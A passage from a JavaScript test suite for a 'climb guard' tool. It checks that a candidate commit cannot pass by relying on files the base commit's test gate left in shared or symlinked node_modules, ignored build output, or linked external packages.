import { writeFileSync } from 'node:fs';
import { dep, token } from 'acme-dep';
import { label } from 'acme-ws';
import { ancPeer, symAncPeer, dirtyAncPeer } from 'acme-linked';
import { clientToken } from './client/use.mjs';
import { webStoreToken } from './web/use.mjs';
import { appDep, scopedPeer, inStore, storeMod, appStoreToken, extNote } from './app/use.mjs';
test('acme adds', () => {
  assert.equal(dep, 'acme');
  assert.equal(clientToken, token);
  assert.equal(webStoreToken, appStoreToken);
  assert.equal(label, 'base-ws');
  assert.equal(ancPeer(), 'anc-clean');
  assert.equal(symAncPeer, 'sym-anc-clean');
  assert.equal(appDep, 'app-clean');
  assert.equal(scopedPeer, 'peer-clean');
  assert.equal(inStore, 'in-store-clean');
  assert.equal(storeMod(), 'store-mod-clean');
  assert.equal(extNote, 'note-clean');
  writeFileSync('node_modules/base-cache', 'from-base\\n');
  writeFileSync('node_modules/acme-dep/cache.txt', 'dirtied-by-base\\n');
  writeFileSync('app/node_modules/acme-app/state.txt', 'dirtied-app\\n');
  writeFileSync('app/node_modules/in-store/val.txt', 'dirtied-in-store\\n');
  writeFileSync('app/node_modules/in-store-mod/state.txt', 'dirtied-store-mod\\n');
  writeFileSync('app/node_modules/ext-note.txt', 'dirtied-note\\n');
  dirtyAncPeer('dirtied-anc\\n');
});
`;
  const dir = await acme(t, {
    climb: { jobs: ['test-time'], testCommand: LEDGER_TEST },
    config: { check: LEDGER_TEST },
    files: {
      '.gitignore': 'node_modules/\nweb/node_modules\napp/node_modules\nclient/node_modules\n',
      'package.json': JSON.stringify({ name: 'acme', private: true, type: 'module', workspaces: ['packages/*'] }),
      'packages/ws/package.json': '{"name":"acme-ws","type":"module","exports":"./index.js"}\n',
      'packages/ws/index.js': "export const label = 'base-ws';\n",
      'client/package.json': '{"name":"acme-client-dir","private":true,"type":"module"}\n',
      'client/use.mjs': "export { token as clientToken } from 'acme-dep';\n",
      'web/package.json': '{"name":"acme-web-dir","private":true,"type":"module"}\n',
      'web/use.mjs': "export { storeToken as webStoreToken } from 'in-store-mod';\n",
      'app/package.json': '{"name":"acme-app-dir","private":true,"type":"module"}\n',
      'app/use.mjs': [
        "import { readFileSync } from 'node:fs';",
        "import { storeMod, storeToken as appStoreToken } from 'acme-app';",
        "const read = p => readFileSync(new URL(p, import.meta.url), 'utf8').trim();",
        "export const appDep = read('./node_modules/acme-app/self/state.txt');",
        "export const scopedPeer = read('./node_modules/@acme/app/peer/peer.txt');",
        "export const inStore = read('./node_modules/acme-app/in-nm/val.txt');",
        "export const extNote = read('./node_modules/ext-note.txt');",
        'export { storeMod, appStoreToken };',
        '',
      ].join('\n'),
      'acme.test.mjs': baseSuite,
    },
  });
  await write(dir, depFiles);
  const sharedInstall = await mkdtemp(join(tmpdir(), 'plates-climb-install-'));
  const extRepo = await mkdtemp(join(tmpdir(), 'plates-climb-ext-repo-'));
  t.after(() => rm(sharedInstall, { recursive: true, force: true }));
  t.after(() => rm(extRepo, { recursive: true, force: true }));
  await write(sharedInstall, {
    'ext-pkg/package.json': '{"name":"acme-app","type":"module","exports":"./index.js"}\n',
    'ext-pkg/index.js': "export { storeMod, storeToken } from 'in-store-mod';\n",
    'ext-pkg/state.txt': 'app-clean\n',
    'ext-peer/peer.txt': 'peer-clean\n',
    'ext-note.txt': 'note-clean\n',
    'node_modules/in-store/val.txt': 'in-store-clean\n',
    'node_modules/in-store-mod/package.json': '{"name":"in-store-mod","type":"module","exports":"./index.js"}\n',
    'node_modules/in-store-mod/index.js': "import { readFileSync } from 'node:fs';\nexport const storeToken = { id: 'store' };\nexport const storeMod = () => readFileSync(new URL('./state.txt', import.meta.url), 'utf8').trim();\n",
    'node_modules/in-store-mod/state.txt': 'store-mod-clean\n',
  });
  await write(extRepo, {
    'packages/acme-linked/package.json': '{"name":"acme-linked","type":"module","exports":"./index.js"}\n',
    'packages/acme-linked/index.js': "export { ancPeer, dirtyAncPeer } from 'acme-anc-peer';\nexport { symAncPeer } from 'acme-sym-anc';\n",
    'node_modules/acme-anc-peer/package.json': '{"name":"acme-anc-peer","type":"module","exports":"./index.js"}\n',
    'node_modules/acme-anc-peer/index.js': "import { readFileSync, writeFileSync } from 'node:fs';\nexport const ancPeer = () => readFileSync(new URL('./state.txt', import.meta.url), 'utf8').trim();\nexport const dirtyAncPeer = v => writeFileSync(new URL('./state.txt', import.meta.url), v);\n",
    'node_modules/acme-anc-peer/state.txt': 'anc-clean\n',
    'sym-parent/packages/acme-sym-anc/package.json': '{"name":"acme-sym-anc","type":"module","exports":"./index.js"}\n',
    'sym-parent/packages/acme-sym-anc/index.js': "export { symAncPeer } from 'acme-sym-peer';\n",
    'sym-store/acme-sym-peer/package.json': '{"name":"acme-sym-peer","type":"module","exports":"./index.js"}\n',
    'sym-store/acme-sym-peer/index.js': "export const symAncPeer = 'sym-anc-clean';\n",
  });
  const { symlink } = await import('node:fs/promises');
  await mkdir(join(sharedInstall, 'node_modules/@acme'), { recursive: true });
  await symlink('.', join(sharedInstall, 'ext-pkg/self'));
  await symlink('../ext-peer', join(sharedInstall, 'ext-pkg/peer'));
  await symlink('../node_modules/in-store', join(sharedInstall, 'ext-pkg/in-nm'));
  await symlink('../../ext-pkg', join(sharedInstall, 'node_modules/@acme/app'));
  await symlink('../ext-pkg', join(sharedInstall, 'node_modules/acme-app'));
  await symlink('../ext-note.txt', join(sharedInstall, 'node_modules/ext-note.txt'));
  await symlink('../missing-ext', join(sharedInstall, 'node_modules/dangling'));
  await symlink('../sym-store', join(extRepo, 'sym-parent/node_modules'), 'dir');
  await symlink('../sym-parent/packages/acme-sym-anc', join(extRepo, 'node_modules/acme-sym-anc'));
  await symlink('../packages/acme-linked', join(extRepo, 'node_modules/acme-linked'));
  await symlink(join('..', 'packages', 'ws'), join(dir, 'node_modules', 'acme-ws'));
  await symlink(join(extRepo, 'packages', 'acme-linked'), join(dir, 'node_modules', 'acme-linked'));
  await symlink('../node_modules', join(dir, 'client', 'node_modules'), 'dir');
  await symlink(join(sharedInstall, 'node_modules'), join(dir, 'web', 'node_modules'), 'dir');
  await symlink(join(sharedInstall, 'node_modules'), join(dir, 'app', 'node_modules'), 'dir');
  const base = git(dir, ['rev-parse', 'HEAD']);

  // Candidate 1: depends on node_modules/base-cache left behind by the base's gate.
  git(dir, ['checkout', '-q', '-b', 'needs-base-cache', base]);
  await commit(dir, {
    'acme.test.mjs': `import { test } from 'node:test';
import assert from 'node:assert/strict';
import { existsSync } from 'node:fs';
test('acme adds', () => { assert.equal(existsSync('node_modules/base-cache'), true); });
`,
  }, 'acme: needs base-cache');
  const cached = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(cached.status, 1, cached.stdout + cached.stderr);
  assert.match(json(cached).problems[0], /the gate `.*` failed \(exit 1\)/);
  assert.equal(existsSync(join(dir, 'node_modules/base-cache')), false);
  assert.equal(await readFile(join(dir, 'node_modules/acme-dep/cache.txt'), 'utf8'), 'clean\n');
  assert.equal(await readFile(join(sharedInstall, 'ext-pkg/state.txt'), 'utf8'), 'app-clean\n');
  assert.equal(await readFile(join(sharedInstall, 'node_modules/in-store/val.txt'), 'utf8'), 'in-store-clean\n');
  assert.equal(await readFile(join(sharedInstall, 'node_modules/in-store-mod/state.txt'), 'utf8'), 'store-mod-clean\n');
  assert.equal(await readFile(join(sharedInstall, 'ext-note.txt'), 'utf8'), 'note-clean\n');
  assert.equal(await readFile(join(extRepo, 'node_modules/acme-anc-peer/state.txt'), 'utf8'), 'anc-clean\n');

  // Candidate 2: depends on an existing file in node_modules (or symlinked app/node_modules) mutated by base's gate.
  git(dir, ['checkout', '-q', '-f', '-B', 'needs-mutated-file', base]);
  await commit(dir, {
    'acme.test.mjs': `import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
test('acme adds', () => { assert.equal(readFileSync('node_modules/acme-dep/cache.txt', 'utf8'), 'dirtied-by-base\\n'); });
`,
  }, 'acme: needs mutated cache');
  const mutated = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(mutated.status, 1, mutated.stdout + mutated.stderr);
  assert.equal(await readFile(join(dir, 'node_modules/acme-dep/cache.txt'), 'utf8'), 'clean\n');

  // Honest candidate: passes from the clean install while base's workspace symlink resolved to base's packages/ws.
  git(dir, ['checkout', '-q', '-f', '-B', 'honest-clean', base]);
  await commit(dir, {
    'packages/ws/index.js': "export const label = 'cand-ws';\n",
    'acme.test.mjs': `import { test } from 'node:test';
import assert from 'node:assert/strict';
import { existsSync, readFileSync } from 'node:fs';
import { dep, token } from 'acme-dep';
import { label } from 'acme-ws';
import { ancPeer, symAncPeer } from 'acme-linked';
import { clientToken } from './client/use.mjs';
import { webStoreToken } from './web/use.mjs';
import { appDep, scopedPeer, inStore, storeMod, appStoreToken, extNote } from './app/use.mjs';
test('acme adds', () => {
  assert.equal(dep, 'acme');
  assert.equal(clientToken, token);
  assert.equal(webStoreToken, appStoreToken);
  assert.equal(label, 'cand-ws');
  assert.equal(ancPeer(), 'anc-clean');
  assert.equal(symAncPeer, 'sym-anc-clean');
  assert.equal(appDep, 'app-clean');
  assert.equal(scopedPeer, 'peer-clean');
  assert.equal(inStore, 'in-store-clean');
  assert.equal(storeMod(), 'store-mod-clean');
  assert.equal(extNote, 'note-clean');
  assert.equal(existsSync('node_modules/base-cache'), false);
  assert.equal(readFileSync('node_modules/acme-dep/cache.txt', 'utf8'), 'clean\\n');
});
`,
  }, 'acme: clean candidate');
  const ok = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(ok.status, 0, ok.stdout + ok.stderr);
});

// #362 review: a workspace package that exports an ignored build artifact (packages/ws/dist) is rebound to the
// worktree's own packages/ws, where git made only the tracked source. Each worktree gets its own copy of that ignored
// output, so the base can import the package, and a write the base's gate leaves there never reaches the candidate.
test('#362: a workspace package\'s ignored build output is in each worktree, copied, not shared', async t => {
  const usesDist = extra => `import { test } from 'node:test';
import assert from 'node:assert/strict';
import { existsSync, writeFileSync } from 'node:fs';
import { label } from 'acme-ws';
test('acme adds', () => {
  assert.equal(label, 'built-ws');
  ${extra}
});
`;
  const dir = await acme(t, {
    climb: { jobs: ['test-time'], testCommand: LEDGER_TEST },
    config: { check: LEDGER_TEST },
    files: {
      '.gitignore': 'node_modules/\ndist/\n',
      'package.json': JSON.stringify({ name: 'acme', private: true, type: 'module', workspaces: ['packages/*'] }),
      'packages/ws/package.json': '{"name":"acme-ws","type":"module","exports":"./dist/index.js"}\n',
      'packages/ws/src/index.js': "export const label = 'built-ws';\n",
      'acme.test.mjs': usesDist("writeFileSync('packages/ws/dist/base-was-here', 'x');"),
    },
  });
  await write(dir, { 'packages/ws/dist/index.js': "export const label = 'built-ws';\n" });
  const { symlink } = await import('node:fs/promises');
  await mkdir(join(dir, 'node_modules'), { recursive: true });
  await symlink(join('..', 'packages', 'ws'), join(dir, 'node_modules', 'acme-ws'));
  const base = git(dir, ['rev-parse', 'HEAD']);

  // A harmless candidate: the unchanged base and the candidate both import the built package.
  git(dir, ['checkout', '-q', '-b', 'harmless', base]);
  await commit(dir, { 'acme.test.mjs': usesDist('// harmless: reads the package, writes nothing') }, 'acme: harmless');
  const ok = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(ok.status, 0, ok.stdout + ok.stderr);

  // A candidate that passes only on what the base's gate wrote into the artifact folder: refused, since its copy is its own.
  git(dir, ['checkout', '-q', '-f', '-B', 'needs-base-write', base]);
  await commit(dir, { 'acme.test.mjs': usesDist("assert.equal(existsSync('packages/ws/dist/base-was-here'), true);") }, 'acme: needs the base write');
  const leaked = climb(dir, ['guard', '--base', base, '--json']);
  assert.equal(leaked.status, 1, leaked.stdout + leaked.stderr);
  assert.equal(existsSync(join(dir, 'packages/ws/dist/base-was-here')), false, "the checkout's own build output is untouched");
});

// #362 follow-up (review comment 4508745045): a package linked from outside the checkout may reach a sibling by a
// relative path (packages/linked/index.cjs requires ../shared/value.cjs). Each worktree gets its own clone of the
// package's whole source tree, laid out as it is, so the unchanged base loads it, and a write the base's gate leaves in
// the sibling never reaches the candidate.
test('#362: a linked package outside the checkout keeps its relative imports of siblings in each worktree, cloned, not shared', async t => {
  const suiteOf = extra => `import { test } from 'node:test';
import assert from 'node:assert/strict';
import { existsSync } from 'node:fs';
import { createRequire } from 'node:module';
import linked from 'acme-linked';
const sibling = createRequire(import.meta.url).resolve('acme-linked').replace(/linked[\\\\/]index\\.cjs$/, 'shared/base-was-here');
test('acme adds', () => {
  assert.equal(linked.value, 'shared-clean');
  ${extra}
});
`;
  for (const how of ['a workspace root', 'a git repository']) {
    const ext = await realpath(await mkdtemp(join(tmpdir(), 'plates-climb-linked-')));
    t.after(() => rm(ext, { recursive: true, force: true }));
    await write(ext, {
      ...(how === 'a workspace root' ? { 'package.json': JSON.stringify({ name: 'acme-ext', private: true, workspaces: ['packages/*'] }) } : {}),
      'packages/linked/package.json': '{"name":"acme-linked","main":"./index.cjs"}\n',
      'packages/linked/index.cjs': "const { value, mark } = require('../shared/value.cjs');\nmodule.exports = { value, mark };\n",
      'packages/shared/value.cjs': "const { join } = require('node:path');\nconst { writeFileSync } = require('node:fs');\nmodule.exports = { value: 'shared-clean', mark: () => writeFileSync(join(__dirname, 'base-was-here'), 'x') };\n",
    });
    if (how === 'a git repository') {
      const id = ['-c', 'user.name=Acme', '-c', 'user.email=acme@example.com'];
      git(ext, ['init', '-q']);
      git(ext, [...id, 'add', '-A']);
      git(ext, [...id, 'commit', '-q', '-m', 'acme-ext']);
    }
    const dir = await acme(t, {
      climb: { jobs: ['test-time'], testCommand: LEDGER_TEST },
      config: { check: LEDGER_TEST },
      files: {
        '.gitignore': 'node_modules/\n',
        'package.json': JSON.stringify({ name: 'acme', private: true, type: 'module' }),
        'acme.test.mjs': suiteOf('linked.mark();'),
      },
    });
    const { symlink } = await import('node:fs/promises');
    await mkdir(join(dir, 'node_modules'), { recursive: true });
    await symlink(join(ext, 'packages', 'linked'), join(dir, 'node_modules', 'acme-linked'));
    const base = git(dir, ['rev-parse', 'HEAD']);

    // A harmless candidate: the unchanged base and the candidate both load the linked package and its sibling.
    git(dir, ['checkout', '-q', '-b', 'harmless', base]);
    await commit(dir, { 'acme.test.mjs': suiteOf('// harmless: reads the package, writes nothing') }, 'acme: harmless');
    const ok = climb(dir, ['guard', '--base', base, '--json']);
    assert.equal(ok.status, 0, `${how}: ${ok.stdout}${ok.stderr}`);

    // A candidate that passes only on what the base's gate wrote into the sibling: refused, since each clone is its own.
    git(dir, ['checkout', '-q', '-f', '-B', 'needs-base-write', base]);
    await commit(dir, { 'acme.test.mjs': suiteOf('assert.equal(existsSync(sibling), true);') }, 'acme: needs the base write');
    const leaked = climb(dir, ['guard', '--base', base, '--json']);
    assert.equal(leaked.status, 1, `${how}: ${leaked.stdout}${leaked.stderr}`);
    assert.equal(existsSync(join(ext, 'packages/shared/base-was-here')), false, `${how}: the original source tree is untouched`);
  }
});

// #383 review (comments 4509313695 and 4509323741): a link reached later can widen the clone to an ancestor tree that
// holds a subtree cloned first. That clone already sits where the wider one puts it, so it is kept, not linked over
// (EEXIST aborted guard before the gate ran), and the module stays one module.
test('#383: a clone widened to an ancestor tree keeps the subtree cloned first, in both layouts the review found', async t => {
  const { symlink } = await import('node:fs/promises');
  const layouts = {
    // a/pkg is linked from the checkout; a/node_modules/acme-b reaches ../../b/pkg, whose tree is the workspace root.
    'a later link to a sibling': async ext => {
      await write(ext, {
        'package.json': JSON.stringify({ name: 'acme-ext', private: true, workspaces: ['a/pkg', 'b/pkg'] }),
        'a/pkg/package.json': '{"name":"acme-a","main":"./index.cjs"}\n',
        'a/pkg/index.cjs': "module.exports = { value: require('acme-b').value };\n",
        'b/pkg/package.json': '{"name":"acme-b","main":"./index.cjs"}\n',
        'b/pkg/index.cjs': "module.exports = { value: 'b-clean' };\n",
      });
      await mkdir(join(ext, 'a/node_modules'), { recursive: true });
      await symlink('../../b/pkg', join(ext, 'a/node_modules/acme-b'));
      return { 'acme-a': join(ext, 'a/pkg') };
    },
    // The checkout's install is ext/inner/node_modules: acme-a -> ../pkg, then acme-b -> ../../other (the workspace root).
    'an install inside the tree': async ext => {
      await write(ext, {
        'package.json': JSON.stringify({ name: 'acme-ext', private: true, workspaces: ['inner/pkg', 'other'] }),
        'inner/pkg/package.json': '{"name":"acme-a","main":"./index.cjs"}\n',
        'inner/pkg/index.cjs': "module.exports = { value: require('acme-b').value };\n",
        'other/package.json': '{"name":"acme-b","main":"./index.cjs"}\n',
        'other/index.cjs': "module.exports = { value: 'b-clean' };\n",
      });
      await mkdir(join(ext, 'inner/node_modules'), { recursive: true });
      await symlink('../pkg', join(ext, 'inner/node_modules/acme-a'));
      await symlink('../../other', join(ext, 'inner/node_modules/acme-b'));
      return { install: join(ext, 'inner/node_modules') };
    },
  };
  const suiteOf = note => `import { test } from 'node:test';
import assert from 'node:assert/strict';
import a from 'acme-a';
test('acme adds', () => { assert.equal(a.value, 'b-clean'); /* ${note} */ });
`;
  for (const [how, make] of Object.entries(layouts)) {
    const ext = await realpath(await mkdtemp(join(tmpdir(), 'plates-climb-nested-')));
    t.after(() => rm(ext, { recursive: true, force: true }));
    const links = await make(ext);
    const dir = await acme(t, {
      climb: { jobs: ['test-time'], testCommand: LEDGER_TEST },
      config: { check: LEDGER_TEST },
      files: { '.gitignore': 'node_modules\n', 'package.json': JSON.stringify({ name: 'acme', private: true, type: 'module' }), 'acme.test.mjs': suiteOf('base') },
    });
    if (links.install) await symlink(links.install, join(dir, 'node_modules'), 'dir');
    else {
      await mkdir(join(dir, 'node_modules'), { recursive: true });
      await symlink(links['acme-a'], join(dir, 'node_modules', 'acme-a'));
    }
    const base = git(dir, ['rev-parse', 'HEAD']);
    git(dir, ['checkout', '-q', '-b', 'harmless', base]);
    await commit(dir, { 'acme.test.mjs': suiteOf('harmless') }, 'acme: harmless');
    const ok = climb(dir, ['guard', '--base', base, '--json']);
    assert.equal(ok.status, 0, `${how}: ${ok.stdout}${ok.stderr}`);
    assert.doesNotMatch(ok.stdout + ok.stderr, /EEXIST/, how);
  }
});
